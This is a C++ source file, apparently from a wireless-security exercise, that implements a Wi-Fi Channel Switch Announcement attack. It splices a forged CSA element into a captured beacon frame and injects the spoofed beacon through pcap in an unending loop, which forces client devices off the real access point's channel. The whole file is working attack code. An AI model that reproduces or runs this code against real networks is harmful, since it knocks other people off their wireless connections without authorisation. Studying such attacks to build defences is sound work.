#include "csa_attack.h"
#include "Dot11.h"
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <cstring>

void send_beacon_with_csa(pcap_t* handle,
                          const uint8_t* orig_packet,
                          size_t packet_len,
                          int ie_offset,
                          uint8_t new_channel)
{
    csa_ie csa = {};
    csa.tag_number = 0x25;
    csa.tag_length = 0x03;
    csa.channel_switch_mode = 0x01;
    csa.new_channel = new_channel;
    csa.channel_switch_count = 0x03;

    // 오름차순 정렬 => 삽입 위치 찾기
    int insert_pos = packet_len;
    size_t offset = ie_offset;
    while (offset < packet_len) {
        const info_element* ie = reinterpret_cast<const info_element*>(orig_packet + offset);
        size_t next_offset = offset + 2 + ie->length;
        if (ie->id > csa.tag_number) {
            insert_pos = offset;
            break;
        }
        offset = next_offset;
    }

    // 새 패킷 만들기
    size_t new_packet_len = packet_len + sizeof(csa);
    std::vector<u_char> new_packet;
    new_packet.reserve(new_packet_len);

    // 1) insert [0..insert_pos)
    new_packet.insert(new_packet.end(), orig_packet, orig_packet + insert_pos);
    // 2) insert csa IE
    new_packet.insert(new_packet.end(),
                      reinterpret_cast<u_char*>(&csa),
                      reinterpret_cast<u_char*>(&csa) + sizeof(csa));
    // 3) insert [insert_pos..end)
    new_packet.insert(new_packet.end(), orig_packet + insert_pos, orig_packet + packet_len);

    // 무한 전송
    while (true) {
        if (pcap_sendpacket(handle, new_packet.data(), static_cast<int>(new_packet_len)) != 0) {
            std::cerr << "[Error] Failed to send CSA beacon: " << pcap_geterr(handle) << std::endl;
        } else {
            std::cerr << "Packet sent successfully" << std::endl;
        }
        // std::this_thread::sleep_for(std::chrono::milliseconds(500)); // 0.5s 간격
    }
}
